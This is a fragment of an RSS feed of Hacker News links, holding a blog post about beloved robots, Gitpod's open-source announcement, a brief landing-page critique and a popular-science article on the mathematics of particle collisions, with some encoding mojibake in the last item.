<p>Source: <a href="https://play.google.com/store/movies/details?id=lfDVLChs2jI&amp;gl=US&amp;utm_source=na_Med&amp;utm_medium=hasem&amp;utm_campaign=MoviesPLA&amp;pcampaignid=MKT-DR-na-us-all-Med-pla-mo-Evergreen-Dec1115-1-movieslibrary&amp;gclid=CjwKCAjwyo36BRAXEiwA24CwGWL_psFBrrF21EnfNQPDkkWrr37zjejRvlynYt1oSgr2cXgp5DmPyhoCppwQAvD_BwE&amp;gclsrc=aw.ds">Google Play Store</a></p>
</blockquote>
<p>I think these robots might actually be aliens, but I'm not sure, so let's keep 'em around.</p>
<h3>2-XL</h3>
<p>I'm all about using robots for learning (see my post on <a href="https://www.charlieharrington.com/mindstorms">Mindstorms, Seymour Papert, and his cute LOGO Turtle robots for teaching kids how to program computers</a>), and 2-XL was my first introduction to robot-powered-learning.</p>
<p><span>
      <a href="https://www.charlieharrington.com/static/e427b0ab3f3772309062f6c535faf3a6/eea4a/2-xl.jpg" target="_blank" rel="noopener">
    <span></span>
  <img alt="2xl" title="2xl" src="https://www.charlieharrington.com/static/e427b0ab3f3772309062f6c535faf3a6/6aca1/2-xl.jpg" srcset="https://www.charlieharrington.com/static/e427b0ab3f3772309062f6c535faf3a6/d2f63/2-xl.jpg 163w,
https://www.charlieharrington.com/static/e427b0ab3f3772309062f6c535faf3a6/c989d/2-xl.jpg 325w,
https://www.charlieharrington.com/static/e427b0ab3f3772309062f6c535faf3a6/6aca1/2-xl.jpg 650w,
https://www.charlieharrington.com/static/e427b0ab3f3772309062f6c535faf3a6/7c09c/2-xl.jpg 975w,
https://www.charlieharrington.com/static/e427b0ab3f3772309062f6c535faf3a6/eea4a/2-xl.jpg 1280w" sizes="(max-width: 650px) 100vw, 650px" loading="lazy">
  </a>
    </span></p>
<blockquote>
<p>Source: <a href="https://en.wikipedia.org/wiki/2-XL">Wikipedia</a></p>
</blockquote>
<p>We got our 2-XL at a garage sale (garage sales were things of wonder to me as a child). Yes, we had the original 2-XL, the eight-track one. In fact, 2-XL was my first and only interaction with an eight-track system. In the early `90s, Tiger Electronics must have bought 2-XL, and they came out with a cassette-version. </p>
<p><span>
      <a href="https://www.charlieharrington.com/static/b4f82ab27f934ed502846b4686fb90e3/41099/2-xl-cassette.jpg" target="_blank" rel="noopener">
    <span></span>
  <img alt="2xl cassette version" title="2xl cassette version" src="https://www.charlieharrington.com/static/b4f82ab27f934ed502846b4686fb90e3/41099/2-xl-cassette.jpg" srcset="https://www.charlieharrington.com/static/b4f82ab27f934ed502846b4686fb90e3/d2f63/2-xl-cassette.jpg 163w,
https://www.charlieharrington.com/static/b4f82ab27f934ed502846b4686fb90e3/c989d/2-xl-cassette.jpg 325w,
https://www.charlieharrington.com/static/b4f82ab27f934ed502846b4686fb90e3/41099/2-xl-cassette.jpg 500w" sizes="(max-width: 500px) 100vw, 500px" loading="lazy">
  </a>
    </span></p>
<blockquote>
<p>Source: <a href="https://en.wikipedia.org/wiki/2-XL">Wikipedia</a></p>
</blockquote>
<p>But I'll always prefer our smart-alecky 8-track 2-XL, and my fond memories of jamming catridges into his belly, wishing that he was a Nintendo Entertainment System instead.</p>
<h3>Mega Man X</h3>
<p>When I was a kid, I was pretty sure that one day I was going to become Mega Man X. Buried alive in a weird time capsule, awokened years later to avenge my creator, upgrading my body with strange new powers.</p>
<p><span>
      <a href="https://www.charlieharrington.com/static/39d29464655aae0ce2f0e13229322f16/41099/mmx.jpg" target="_blank" rel="noopener">
    <span></span>
  <img alt="Mega Man X" title="Mega Man X" src="https://www.charlieharrington.com/static/39d29464655aae0ce2f0e13229322f16/41099/mmx.jpg" srcset="https://www.charlieharrington.com/static/39d29464655aae0ce2f0e13229322f16/d2f63/mmx.jpg 163w,
https://www.charlieharrington.com/static/39d29464655aae0ce2f0e13229322f16/c989d/mmx.jpg 325w,
https://www.charlieharrington.com/static/39d29464655aae0ce2f0e13229322f16/41099/mmx.jpg 500w" sizes="(max-width: 500px) 100vw, 500px" loading="lazy">
  </a>
    </span></p>
<blockquote>
<p>Source: <a href="https://www.amazon.co.uk/Mega-Man-Megaman-X/dp/B00004TMBD">Amazon</a></p>
</blockquote>
<p>I'm still waiting for that to happen, but the the mean time, I recently started playing Mega Max X2, and it's hard! I'm four bosses in, haven't found a single upgrade, and only snagged one heart container so far. Wish me luck.</p>
<h3>DUM-E and U</h3>
<p>Robot arms with quirky personalities, built by someone named Tony Stark.</p>
<p><span>
      <a href="https://www.charlieharrington.com/static/653244aa1db702282adae95d91fb4138/41099/starm.jpg" target="_blank" rel="noopener">
    <span></span>
  <img alt="Stark" title="Stark" src="https://www.charlieharrington.com/static/653244aa1db702282adae95d91fb4138/41099/starm.jpg" srcset="https://www.charlieharrington.com/static/653244aa1db702282adae95d91fb4138/d2f63/starm.jpg 163w,
https://www.charlieharrington.com/static/653244aa1db702282adae95d91fb4138/c989d/starm.jpg 325w,
https://www.charlieharrington.com/static/653244aa1db702282adae95d91fb4138/41099/starm.jpg 500w" sizes="(max-width: 500px) 100vw, 500px" loading="lazy">
  </a>
    </span></p>
<blockquote>
<p>Source: <a href="https://ironman.fandom.com/wiki/Dum-E_and_U">Fandom</a></p>
</blockquote>
<p>PSA - check out <a href="https://www.amazon.com/gp/product/1250192757/ref=as_li_qf_asin_il_tl?ie=UTF8&amp;tag=whatrocks09-20&amp;creative=9325&amp;linkCode=as2&amp;creativeASIN=1250192757&amp;linkId=041dcc62a5770e833dc59991bf57e5ee">Sourdough by Robin Sloan</a> for a great little novel on robot arms, bread-making, and San Francisco.</p>
<h3>Metal Head</h3>
<p>Two of my favorite things in one terrifying package - turtles and robots:</p>
<p><span>
      <a href="https://www.charlieharrington.com/static/77ae95136bf95ec6a8828bce2a0b9f3f/b8284/metalhead.jpg" target="_blank" rel="noopener">
    <span></span>
  <img alt="Metal Head" title="Metal Head" src="https://www.charlieharrington.com/static/77ae95136bf95ec6a8828bce2a0b9f3f/6aca1/metalhead.jpg" srcset="https://www.charlieharrington.com/static/77ae95136bf95ec6a8828bce2a0b9f3f/d2f63/metalhead.jpg 163w,
https://www.charlieharrington.com/static/77ae95136bf95ec6a8828bce2a0b9f3f/c989d/metalhead.jpg 325w,
https://www.charlieharrington.com/static/77ae95136bf95ec6a8828bce2a0b9f3f/6aca1/metalhead.jpg 650w,
https://www.charlieharrington.com/static/77ae95136bf95ec6a8828bce2a0b9f3f/7c09c/metalhead.jpg 975w,
https://www.charlieharrington.com/static/77ae95136bf95ec6a8828bce2a0b9f3f/b8284/metalhead.jpg 985w" sizes="(max-width: 650px) 100vw, 650px" loading="lazy">
  </a>
    </span></p>
<blockquote>
<p>Source: <a href="https://turtlepedia.fandom.com/wiki/Metalhead_(IDW)">Fandom</a></p>
</blockquote>
<p>Not to be confused with the always-evil Mechaturtles from the impossible original Nintendo TMNT game:</p>
<p><span>
      <a href="https://www.charlieharrington.com/static/dfd0388a52796c6aa0b6271fa404d8f9/16745/Mechaturtle1.png" target="_blank" rel="noopener">
    <span></span>
  <img alt="Mechaturtles" title="Mechaturtles" src="https://www.charlieharrington.com/static/dfd0388a52796c6aa0b6271fa404d8f9/16745/Mechaturtle1.png" srcset="https://www.charlieharrington.com/static/dfd0388a52796c6aa0b6271fa404d8f9/16745/Mechaturtle1.png 78w" sizes="(max-width: 78px) 100vw, 78px" loading="lazy">
  </a>
    </span></p>
<blockquote>
<p>Source: <a href="https://turtlepedia.fandom.com/wiki/Mechaturtle">Fandom</a></p>
</blockquote>
<h3>Sonic Sam</h3>
<p>I had one of these (it's still in my parent's attic). This guy rolled around our kitchen, flashing its eyes and emitting weird smoke from its mouth.</p>
<p><span>
      <a href="https://www.charlieharrington.com/static/de0408c04849f7c44e84532c3e696f1a/c08c5/robottoy.jpg" target="_blank" rel="noopener">
    <span></span>
  <img alt="Sonic Sam" title="Sonic Sam" src="https://www.charlieharrington.com/static/de0408c04849f7c44e84532c3e696f1a/c08c5/robottoy.jpg" srcset="https://www.charlieharrington.com/static/de0408c04849f7c44e84532c3e696f1a/d2f63/robottoy.jpg 163w,
https://www.charlieharrington.com/static/de0408c04849f7c44e84532c3e696f1a/c989d/robottoy.jpg 325w,
https://www.charlieharrington.com/static/de0408c04849f7c44e84532c3e696f1a/c08c5/robottoy.jpg 640w" sizes="(max-width: 640px) 100vw, 640px" loading="lazy">
  </a>
    </span></p>
<blockquote>
<p>Source: <a href="https://www.spotern.com/en/spot/tv/stranger-things/188454/the-robot-magic-mike-ii-from-dustin-henderson-gaten-matarazzo-in-stranger-things-season-3">Spotern</a></p>
</blockquote>
<p>And it's now memorialized in one of my favorite TV shows.</p>
<h3>Robo from Chrono Trigger</h3>
<p>The best JRPG of all time? I think so. I loved Chrono and his gang. I used to draw them all the time. Frog and Robo were my favs.</p>
<p><span>
      <a href="https://www.charlieharrington.com/static/6c22080c421e67c0bac7aee47f76f0de/772e8/robo.png" target="_blank" rel="noopener">
    <span></span>
  <img alt="Robo" title="Robo" src="https://www.charlieharrington.com/static/6c22080c421e67c0bac7aee47f76f0de/772e8/robo.png" srcset="https://www.charlieharrington.com/static/6c22080c421e67c0bac7aee47f76f0de/222b7/robo.png 163w,
https://www.charlieharrington.com/static/6c22080c421e67c0bac7aee47f76f0de/772e8/robo.png 200w" sizes="(max-width: 200px) 100vw, 200px" loading="lazy">
  </a>
    </span></p>
<blockquote>
<p>Source: <a href="https://chrono.fandom.com/wiki/Robo">Fandom</a></p>
</blockquote>
<h3>The Iron Giant</h3>
<p>Sometimes giant robots are gentle and curious. They just want to love and learn. The Iron Giant is one of those robots.</p>
<p><span>
      <a href="https://www.charlieharrington.com/static/2a5c15093914ba94c385d4a49fd0f063/23db2/irongiant.jpg" target="_blank" rel="noopener">
    <span></span>
  <img alt="Iron Giant" title="Iron Giant" src="https://www.charlieharrington.com/static/2a5c15093914ba94c385d4a49fd0f063/23db2/irongiant.jpg" srcset="https://www.charlieharrington.com/static/2a5c15093914ba94c385d4a49fd0f063/d2f63/irongiant.jpg 163w,
https://www.charlieharrington.com/static/2a5c15093914ba94c385d4a49fd0f063/23db2/irongiant.jpg 269w" sizes="(max-width: 269px) 100vw, 269px" loading="lazy">
  </a>
    </span></p>
<blockquote>
<p>Source: <a href="https://upload.wikimedia.org/wikipedia/en/d/d3/The_Iron_Giant_poster.JPG">Wikipedia</a></p>
</blockquote>
<p>Kids and robots just go together, like kids and E.T.</p>
<h3>Cozmo</h3>
<p>A programmable robot!</p>
<p><span>
      <a href="https://www.charlieharrington.com/static/0aa53da4daf21c62993620a41767c0a2/1cfc2/cozmo.png" target="_blank" rel="noopener">
    <span></span>
  <img alt="Cozmo" title="Cozmo" src="https://www.charlieharrington.com/static/0aa53da4daf21c62993620a41767c0a2/a6d36/cozmo.png" srcset="https://www.charlieharrington.com/static/0aa53da4daf21c62993620a41767c0a2/222b7/cozmo.png 163w,
https://www.charlieharrington.com/static/0aa53da4daf21c62993620a41767c0a2/ff46a/cozmo.png 325w,
https://www.charlieharrington.com/static/0aa53da4daf21c62993620a41767c0a2/a6d36/cozmo.png 650w,
https://www.charlieharrington.com/static/0aa53da4daf21c62993620a41767c0a2/1cfc2/cozmo.png 900w" sizes="(max-width: 650px) 100vw, 650px" loading="lazy">
  </a>
    </span></p>
<blockquote>
<p>Source: <a href="https://www.digitaldreamlabs.com/pages/cozmo">Digital Dream Labs</a></p>
</blockquote>
<p>Cozmo's fatal flaw is how nearly impossible it is to connect your phone to the robot's local wifi service, which is how you are forced to control and interact with Cozmo. The connection process is random, non-deterministic, and saps up most of the time you've allocated to play with Cozmo. Also, Cozmo's parent company recently went out of business, which is a huge bummer for the robot-toy industry.</p>
<p>That said, I've had a lot fun with Cozmo, including <a href="https://www.charlieharrington.com/teaching-my-robot-with-tensorflow">teaching him how to find my toothpaste with a TensorFlow computer vision model</a>.</p>
<h3>Droids</h3>
<p>Okay, the main event. Droids.</p>
<p>The Star Wars folks who put together the droids for A New Hope are complete geniuses. They're dirty, they're resilient, they're loyal, they're funny, they're everywhere. I could go through a whole list of them, cause I really do love them all (GNKs, Artoo, Threepio, IG-88, BB-8, those little mouse-like black boxes in the Death Star), but in a rare dose of restraint, here's my favorite Star Wars droid!</p>
<h4>WED-15-1016</h4>
<p>It's R.O.B. with a longer neck, a blue face, and way more creepy claw arms. You may remember this robot critter from its role in repairing the Millenium Falcon at Hoth Base in Empire Strikes Back. Or at least attempting to repair.</p>
<p><span>
      <a href="https://www.charlieharrington.com/static/da34ef15c6d3d7825f5cff64051e89b3/cb69c/wed-techie.jpg" target="_blank" rel="noopener">
    <span></span>
  <img alt="wed-technie" title="wed-technie" src="https://www.charlieharrington.com/static/da34ef15c6d3d7825f5cff64051e89b3/cb69c/wed-techie.jpg" srcset="https://www.charlieharrington.com/static/da34ef15c6d3d7825f5cff64051e89b3/d2f63/wed-techie.jpg 163w,
https://www.charlieharrington.com/static/da34ef15c6d3d7825f5cff64051e89b3/cb69c/wed-techie.jpg 320w" sizes="(max-width: 320px) 100vw, 320px" loading="lazy">
  </a>
    </span></p>
<blockquote>
<p>Source: <a href="https://starwarsataglance.wordpress.com/2014/06/30/wed-1016-teche/">Star Wars At a Glance</a></p>
</blockquote>
<p>I treasuring my WED-15-1016 card from the Star Wars collectible card game, and I'd play it every single one of our daily games in latchkey, no matter what. (Side note: listen to this <a href="http://www.zachtronics.com/podcast/">great Zachtronics podcast</a> episode with one of the designers of the Star Wars and Star Trek collectible card games)</p>
<p><span>
      <a href="https://www.charlieharrington.com/static/42d3d89633a83af49f7eb084c0aa25cc/a414c/wed-card.png" target="_blank" rel="noopener">
    <span></span>
  <img alt="wed-card" title="wed-card" src="https://www.charlieharrington.com/static/42d3d89633a83af49f7eb084c0aa25cc/a414c/wed-card.png" srcset="https://www.charlieharrington.com/static/42d3d89633a83af49f7eb084c0aa25cc/222b7/wed-card.png 163w,
https://www.charlieharrington.com/static/42d3d89633a83af49f7eb084c0aa25cc/a414c/wed-card.png 206w" sizes="(max-width: 206px) 100vw, 206px" loading="lazy">
  </a>
    </span></p>
<blockquote>
<p>Source: <a href="http://www.cardgamedb.com/index.php/starwars/star-wars-card-spoilers/_/the-hoth-cycle/assault-on-echo-base/wed-15-1016-assault-on-echo-base-55-2">Card Game DB</a></p>
</blockquote>
<p>Here is one of WED-15-1016's cousins, a fully tricked-out WED Treadwell with all sorts of terrifying arms and claws:</p>
<p><span>
      <a href="https://www.charlieharrington.com/static/6afe934f96e3f13bbf2ce81b82c3f2c6/0d333/WED-treadwell.jpg" target="_blank" rel="noopener">
    <span></span>
  <img alt="wed-tread" title="wed-tread" src="https://www.charlieharrington.com/static/6afe934f96e3f13bbf2ce81b82c3f2c6/6aca1/WED-treadwell.jpg" srcset="https://www.charlieharrington.com/static/6afe934f96e3f13bbf2ce81b82c3f2c6/d2f63/WED-treadwell.jpg 163w,
https://www.charlieharrington.com/static/6afe934f96e3f13bbf2ce81b82c3f2c6/c989d/WED-treadwell.jpg 325w,
https://www.charlieharrington.com/static/6afe934f96e3f13bbf2ce81b82c3f2c6/6aca1/WED-treadwell.jpg 650w,
https://www.charlieharrington.com/static/6afe934f96e3f13bbf2ce81b82c3f2c6/7c09c/WED-treadwell.jpg 975w,
https://www.charlieharrington.com/static/6afe934f96e3f13bbf2ce81b82c3f2c6/0d333/WED-treadwell.jpg 1175w" sizes="(max-width: 650px) 100vw, 650px" loading="lazy">
  </a>
    </span></p>
<blockquote>
<p>Source: <a href="https://starwars.fandom.com/wiki/WED_Treadwell_repair_droid/Legends">Fandom</a></p>
</blockquote>
<p>I even found this questionably-real deleted scene from A New Hope showing an impatient Luke Skywalker interacting with a Treadwell on Tattoine:</p>
<iframe width="720" height="415" src="https://www.youtube.com/embed/nDPZfPe5F-w" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe>
<h2>More robots</h2>
<p>So, who did I miss in my list? Data? He's an android, so not exactly a robot. But possibly Mega Man X is an android, so maybe I'm already mixing things up.</p>
<p>Speaking of lists, I also found this gigantic <a href="https://en.wikipedia.org/wiki/List_of_fictional_robots_and_androids">list of fictional robots and androids</a> on Wikipedia.</p>
<p>I'm not-so-secretly hoping that, one day, the robots in my book will be added to this Wikipedia list. Yes, I could edit the Wikipedia page myself, but c'mon, that's not the goal here.</p>
<h2>From cardboard to ciruit boards</h2>
<p>Also, it's high time to upgrade my hobby. I've begun looking into basic robotics kits, and I'll hopefully be constructing some new robotic best friends very soon. Maybe not Maker-Faire worthy, but ya gotta start somewhere.</p></div></div>]]>
            </description>
            <link>https://www.charlieharrington.com/robots-i-love</link>
            <guid isPermaLink="false">hacker-news-small-sites-24271121</guid>
            <pubDate>Tue, 25 Aug 2020 13:32:48 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Gitpod is now Open Source]]>
            </title>
            <description>
<![CDATA[
Score 11 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24271090">thread link</a>) | @henningcash
<br/>
August 25, 2020 | https://www.gitpod.io/blog/opensource/ | <a href="https://web.archive.org/web/*/https://www.gitpod.io/blog/opensource/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p>As of today Gitpod is open source under the AGPL license at <a href="https://github.com/gitpod-io/gitpod" target="_blank" rel="nofollow noopener noreferrer">github.com/gitpod-io/gitpod</a>. This allows the community to participate in the development of Gitpod, provides more transparency and makes it even easier for developers to use and integrate Gitpod in their workflows.</p>
<p>For those of you who know us, this probably does not come as a big surprise. Working in open source is in our DNA and everything we’ve created over the past 10 years, including <a href="https://github.com/eclipse-theia/theia" target="_blank" rel="nofollow noopener noreferrer">Theia</a>, <a href="https://github.com/eclipse/xtext" target="_blank" rel="nofollow noopener noreferrer">Xtext</a>, <a href="https://github.com/eclipse/openvsx" target="_blank" rel="nofollow noopener noreferrer">Open VSX</a> and many other projects have been open source. In fact, Gitpod was our only closed-source project and it is a relief to change that going forward.</p>

<p>Contributing to Gitpod should be easy and accessible for everyone. All contributions are welcome, including pull requests, issues, documentation as well as updates and tweaks, blog posts, tutoials, and more. Please head over to <a href="https://github.com/gitpod-io/gitpod" target="_blank" rel="nofollow noopener noreferrer">Github</a> to find out about the various ways you can contribute and join our <a href="https://community.gitpod.io/" target="_blank" rel="nofollow noopener noreferrer">Gitpod Community</a>.</p>
<p>Over the past year, Gitpod has simplified contributions to many open source projects (see <a href="https://contribute.dev/" target="_blank" rel="nofollow noopener noreferrer">contribute.dev</a> for examples). Today, everyone in our team is excited to share our own streamlined development pipeline including Kubernetes preview deployments, an aggressively cached build system, our own slim and fast CI system and of course Gitpod, which continuously beams us into ready-to-code (and debug) dev environments. <a href="https://github.com/csweichel" target="_blank" rel="nofollow noopener noreferrer">Chris</a> gave a great talk about this setup earlier this year 👇</p>
<div> <p> <iframe title="" src="https://www.youtube.com/embed/dFMpXUsJcGM?rel=0" allowfullscreen=""></iframe> </p> </div>
<p>Naturally, we develop Gitpod in Gitpod. This allows the  whole team  to spin up fully initialized, remote dev environments on any branch at any time. </p>
<p>In line with the <a href="http://cloudscaling.com/blog/cloud-computing/the-history-of-pets-vs-cattle/?utm_source=thenewstack&amp;utm_medium=website&amp;utm_campaign=platform" target="_blank" rel="nofollow noopener noreferrer">pets vs. cattle</a> analogy of the cloud-native world, we treat dev environments as automated (yet customizable) resources you can spin up when you need them and close down (and forget about) when you are done with your task. Once you experience the peace of mind of automated, ephemeral dev environments you never want to go back.</p>
<p>Sven will run a webinar next week on Thursday, where we will showcase how we use Gitpod internally at Gitpod and how much it improves our workflow. Hope to see you there! </p>



<p>The <a href="https://www.gitpod.io/pricing/#" target="_blank" rel="nofollow noopener noreferrer">SaaS offering of gitpod.io</a> remains the easiest way to streamline your development workflows with continuously prebuilt dev environments. </p>
<p>In case you want to host Gitpod on your own infrastructure or private cloud, starting today, Gitpod Self-Hosted is free for unlimited users. Organizations using Gitpod Self-Hosted can purchase an enterprise license in order to get additional features like:</p>
<ul>
<li><a href="https://www.gitpod.io/features/#snapshot" target="_blank" rel="nofollow noopener noreferrer">Snapshots</a> (share a reproducible workspace with your team)</li>
<li><a href="https://www.gitpod.io/features/#share" target="_blank" rel="nofollow noopener noreferrer">Live Share</a> (invite others into your running workspace)</li>
<li><a href="https://www.gitpod.io/features/#prebuilt" target="_blank" rel="nofollow noopener noreferrer">Unlimited Prebuilds</a> (making ephemeral dev environments possible)</li>
<li>Admin Dashboard</li>
</ul>
<p>Offering a paid plan for enterprises makes it possible for us to keep working towards building a new category in developer tooling, which completes modern DevOps pipelines. In the future we will add additional functionality to both the open source code as well our paid offering.</p>
</div></div></div>]]>
            </description>
            <link>https://www.gitpod.io/blog/opensource/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24271090</guid>
            <pubDate>Tue, 25 Aug 2020 13:28:47 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Blinkist's landing page is almost perfect]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 6 (<a href="https://news.ycombinator.com/item?id=24270762">thread link</a>) | @themarcthomas
<br/>
August 25, 2020 | https://www.iammarcthomas.com/videos/blinkist-landing-page | <a href="https://web.archive.org/web/*/https://www.iammarcthomas.com/videos/blinkist-landing-page">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p>Blinkist know exactly who their customer is – it's CEOs, founders, VCs and other general tech people who are pretty busy and are either looking for a way to increase their knowledge quickly or to read books faster. </p><p>They know how to perfect that customer profile – they make reference to people like Yuval Noah Harari (Sapiens) and other writers like Seth Godin throughout. </p><p>Their free trial explainer is the best I’ve ever seen – this is one of the best illustrations of how much value I'll get from a trial that I've seen yet. </p><p>Their teaser content is expansive – This is so important for product businesses. </p><p>But what’s up with their CTAs? – Seems like a missed opportunity!</p></div></div></div>]]>
            </description>
            <link>https://www.iammarcthomas.com/videos/blinkist-landing-page</link>
            <guid isPermaLink="false">hacker-news-small-sites-24270762</guid>
            <pubDate>Tue, 25 Aug 2020 12:49:56 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Mathematical Structure of Particle Collisions Comes into View]]>
            </title>
            <description>
<![CDATA[
Score 50 | Comments 5 (<a href="https://news.ycombinator.com/item?id=24270579">thread link</a>) | @rbanffy
<br/>
August 25, 2020 | http://abstractions.nautil.us/article/606/the-mathematical-structure-of-particle-collisions-comes-into-view | <a href="https://web.archive.org/web/*/http://abstractions.nautil.us/article/606/the-mathematical-structure-of-particle-collisions-comes-into-view">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
        <p><span><br></span><span>W</span>hen particle physicists try to model experiments, they confront an impossible calculation—an infinitely long equation that lies beyond the reach of modern mathematics.&nbsp;<br></p>

<p>Fortunately, they can generate largely accurate predictions without seeing this arcane math all the way through. By cutting the calculation short, scientists at CERNâ€™s Large Hadron Collider in Europe make forecasts that match events they actually observe when they send subatomic particles barreling toward each other around a nearly 17-mile track.</p>
<p>Unfortunately, the era of agreement between forecast and observation may be ending. As measurements grow more precise, the approximation schemes theorists use to make predictions may not be able to keep up.</p>
<p>â€œWeâ€™re getting close to exhausting what can be done,â€� said&nbsp;<a href="https://theory.cern/roster/duhr-claude" target="_blank">Claude Duhr</a>, a particle physicist at CERN.&nbsp;</p>
<p>But&nbsp;<a href="https://link.springer.com/article/10.1007/JHEP02(2019)139" target="_blank">three</a>&nbsp;<a href="https://journals.aps.org/prl/abstract/10.1103/PhysRevLett.123.201602" target="_blank">papers</a>&nbsp;from a group of physicists led by&nbsp;<a href="https://amplitudesatpadova.wixsite.com/amplitudes-at-padova" target="_blank">Pierpaolo Mastrolia</a>&nbsp;of the University of Padua in Italy and&nbsp;<a href="https://www.ias.edu/scholars/sebastian-mizera" target="_blank">Sebastian Mizera</a>&nbsp;of the Institute for Advanced Study in Princeton, New Jersey, have revealed an underlying mathematical structure in the equations. The structure provides a new way of collapsing interminable terms into just dozens of essential components. Their method may help bring about new levels of predictive accuracy, which theorists desperately need if they are to move beyond the leading but incomplete model of particle physics.</p>
<p>â€œThey have delivered lots of proof-of-concept results which show that this is a very promising technique,â€� Duhr said.</p>
<p>There could be a bigger payoff than improved predictions.&nbsp;</p>
<p>The new method skirts the traditional mathematical slog by directly computing â€œintersection numbers,â€� which some hope could eventually lead to a more elegant description of the subatomic world.&nbsp;</p>
<p>â€œThis is something thatâ€™s not just mathematics,â€� said&nbsp;<a href="https://www.physics.mcgill.ca/~schuot/" target="_blank">Simon Caron-Huot</a>&nbsp;of McGill University, a quantum theorist who is studying the implications of Mastrolia and Mizeraâ€™s work.&nbsp;â€œItâ€™s something thatâ€™s deeply baked into quantum field theory.â€�&nbsp;</p>
<p><strong>An Infinite Loop</strong></p>
<p>When physicists model particle collisions they use a tool called a Feynman diagram, a simple schematic invented by Richard Feynman in the 1940s.</p>
<p>To get a feel for these diagrams, consider a simple particle event: Two quarks streak in, exchange a single gluon as they â€œcollide,â€� then bounce away on their separate trajectories.</p>
<p>In a Feynman diagram the quarksâ€™ paths are represented by â€œlegs,â€� which join to form â€œverticesâ€� when particles interact. Feynman developed rules for turning this cartoon into an equation which calculates the probability that the event actually takes place: You write a specific function for each leg and vertex—generally a fraction involving the particleâ€™s mass and momentum—and multiply everything together. For straightforward scenarios like this one, the calculation might fit on a cocktail napkin.&nbsp;</p>
<figure><img src="https://s3.amazonaws.com/nautilus-vertical/abstractions_5242dbae24adf53fee012a27d96504f9.jpg" alt="nautilus gluon"><figcaption><br><span>Samuel Velasco/Quanta Magazine</span></figcaption></figure>
<p>But the golden rule of quantum theory is to consider all possibilities, and exchanging a simple gluon represents just one among a vast landscape of scenarios that could unfold when two quarks collide. The exchanged gluon might momentarily split into a â€œvirtualâ€� quark pair, for instance, before reconstituting itself in a flash. Two quarks enter and two quarks leave, but a lot can happen in the middle. A full accounting, implying a perfect prediction, would demand an infinite number of diagrams. No one expects perfection, but the key to improving a calculationâ€™s precision is getting further along in the infinite line of events.<strong>&nbsp;</strong><br></p>
<p>And thatâ€™s where physicists are getting stuck.&nbsp;</p>
<p>Zooming in to that hidden center involves virtual particles—quantum fluctuations that subtly influence each interactionâ€™s outcome. The fleeting existence of the quark pair above, like many virtual events, is represented by a Feynman diagram with a closed â€œloop.â€� Loops confound physicists—theyâ€™re black boxes that introduce additional layers of infinite scenarios. To tally the possibilities implied by a loop, theorists must turn to a summing operation known as an integral. These integrals take on monstrous proportions in multi-loop Feynman diagrams, which come into play as researchers march down the line and fold in more complicated virtual interactions.&nbsp;</p>
<p>Physicists have algorithms to compute the probabilities of no-loop and one-loop scenarios, but many two-loop collisions bring computers to their knees. This imposes a ceiling on predictive precision—and on how well physicists can understand what quantum theory says.&nbsp;</p>
<center>
<iframe width="560" height="315" src="https://www.youtube.com/embed/qe7atm1x6Mg" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""><span id="selection-marker-1" class="redactor-selection-marker"></span></iframe>
</center>
<p>But there is one small mercy: Physicists donâ€™t need to calculate every last integral in a complicated Feynman diagram because the vast majority can be lumped together.<br></p>
<p>Thousands of integrals can be reduced to just dozens of â€œmaster integrals,â€� which are weighted and added together. But exactly which integrals can be subsumed under which master integrals is itself a hard computational question. Researchers use computers to essentially guess at millions of relationships and laboriously extract the combinations of integrals that matter.</p>
<p>But with intersection numbers, physicists may have found a way of elegantly plucking out the essential information from a sprawling calculation of Feynman integrals.</p>
<p><strong>A Geometric Fingerprint&nbsp;</strong></p>
<p>Mastrolia and Mizeraâ€™s work is rooted in a branch of pure math called algebraic topology, which classifies shapes and spaces. Mathematicians pursue this classification with â€œcohomologyâ€� theories, which allow them to extract algebraic fingerprints from complicated geometric spaces.</p>
<p>â€œItâ€™s kind of a summary, an algebraic gadget that incorporates the essence of the space you want to study,â€� said&nbsp;<a href="https://imag.umontpellier.fr/~dupont/" target="_blank">ClÃ©ment Dupont</a>, a mathematician at the University of Montpellier in France.</p>
<p>Feynman diagrams can be translated into geometric spaces that are amenable to analysis by cohomology. Each point within these spaces might represent one of a multitude of scenarios that could play out when two particles collide.</p>
<p>You might hope, naively, that by taking the cohomology of this space—finding its algebraic structure—you could calculate the weights for the master integrals that support it. But the type of geometric space that characterizes most Feynman diagrams is warped in a way that resists many cohomology calculations.</p>
<p>In 2017, Mizera was struggling to analyze how objects in string theory collide when he stumbled upon tools pioneered by Israel Gelfand and Kazuhiko Aomoto in the 1970s and 1980s as they worked with a type of cohomology called â€œtwisted cohomology.â€� Later that year Mizera met Mastrolia, who realized that these techniques could work for Feynman diagrams too. In 2019,&nbsp;they published three papers that used this cohomology theory to streamline calculations involving simple particle collisions.</p>
<p>Their method takes a family of related physical scenarios, represents it as a geometric space, and calculates the twisted cohomology of that space. â€œThis twisted cohomology has everything to say about the integrals we are interested in,â€� Mizera said.</p>
<p>In particular, the twisted cohomology tells them how many master integrals to expect and what their weights should be. The weights emerge as values they call â€œintersection numbers.â€� In the end, thousands of integrals shrink to a weighted sum of dozens of master integrals.</p>
<p>The cohomology theories that produce these intersection numbers may do more than just ease a computational burden—they could also point to the physical significance of the most important quantities in the calculation.</p>
<p>For example, when a virtual gluon splits into two virtual quarks, the quarksâ€™ possible lifetimes can vary. In the associated geometric space, each point can stand for a different quark lifetime. When researchers compute the weights, they see that scenarios with the longest-lasting virtual particles—that is, cases in which the particles become essentially real—shape the outcome the most.</p>
<p>â€œThatâ€™s the amazing thing about this method,â€� said Caron-Huot. â€œIt reconstructs everything starting from just these rare, special events.â€�</p>
